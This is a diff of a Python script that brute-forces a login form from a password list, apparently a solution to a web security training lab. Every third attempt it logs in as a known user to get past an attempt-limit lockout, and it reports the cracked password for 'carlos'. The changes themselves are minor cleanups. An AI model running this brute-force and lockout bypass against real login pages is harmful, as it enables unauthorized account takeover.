@@ -6,9 +6,9 @@ import getopt
 
 def clear_screen():
   if os.name == 'posix':
-    clear_window = os.system('clear')
+    os.system('clear')
   else:
-    clear_window = os.system('cls')
+    os.system('cls')
 
 
 def get_password(url, session):
@@ -20,11 +20,11 @@ def get_password(url, session):
     password = password.strip()
     
     if (number % 3 == 0) :
-      data = {'username' : "wiener", 'password' :  "peter"}
+      data = {'username': "wiener", 'password':  "peter"}
       number += 1
       response = session.post(url, data=data)
     else:
-      data = {'username' : username, 'password' :  password}
+      data = {'username': username, 'password':  password}
       number += 1
       response = session.post(url, data=data)
       clear_screen()
@@ -32,11 +32,8 @@ def get_password(url, session):
 
       if "Incorrect password" not in response.text:
         valid_password = password
-        break
-
-  passwords.close()
-
-  return valid_password
+        passwords.close()
+        return valid_password
 
 
 def main(argv):
@@ -58,6 +55,7 @@ def main(argv):
   session = requests.Session()
   password = get_password(url, session)
   clear_screen()
+  
   print(f"[*] The username is: \"carlos\"\n[*] The password is: \"{password}\"")
 
 
